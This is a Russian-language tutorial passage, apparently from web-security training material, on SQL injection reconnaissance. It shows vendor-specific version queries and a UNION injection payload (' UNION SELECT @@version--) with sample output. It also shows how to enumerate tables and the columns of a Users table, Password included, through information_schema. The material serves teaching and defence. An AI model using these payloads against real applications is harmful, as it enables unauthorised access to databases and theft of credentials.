## Запрос типа и версии базы данных

Потенциально можно определить тип и версию базы данных, внедрив запросы, специфичные для поставщика, чтобы проверить, работает ли один из них.

Примеры некоторых запросов для определения версии базы данных для популярных типов баз данных:

|                   |                           |
| ----------------- | ------------------------- |
| Тип базы данных   | Запрос                    |
| Майкрософт, MySQL | `SELECT @@version`        |
| Oracle            | `SELECT * FROM v$version` |
| PostgreSQL        | `SELECT version()`        |

Например, можно использовать `UNION` атаковать со следующим вводом:
`' UNION SELECT @@version--`

Это может вернуть следующий вывод. В этом случае можно подтвердить, что это база данных Microsoft SQL Server, и увидеть используемую версию:

`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`


## Вывод содержимого базы данных

Большинство типов баз данных (**кроме Oracle**) имеют набор представлений, называемый информационной схемой. Это предоставляет информацию о базе данных.

Например, можно запросить `information_schema.tables` чтобы перечислить таблицы в базе данных: 
`SELECT * FROM information_schema.tables`

Это возвращает вывод, подобный следующему:
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== 
MyDatabase     dbo       Products     BASE TABLE 
MyDatabase     dbo       Users        BASE TABLE 
MyDatabase     dbo       Feedback     BASE TABLE
```

Этот вывод показывает, что существуют три таблицы, называемые `Products`, `Users`, и `Feedback`.

Затем мы можем запросить `information_schema.columns` чтобы перечислить столбцы в отдельных таблицах:
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

Это возвращает вывод, подобный следующему:
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= 
MyDatabase     dbo       Users     UserId       int 
MyDatabase     dbo       Users     Username     varchar 
MyDatabase     dbo       Users     Password     varchar
```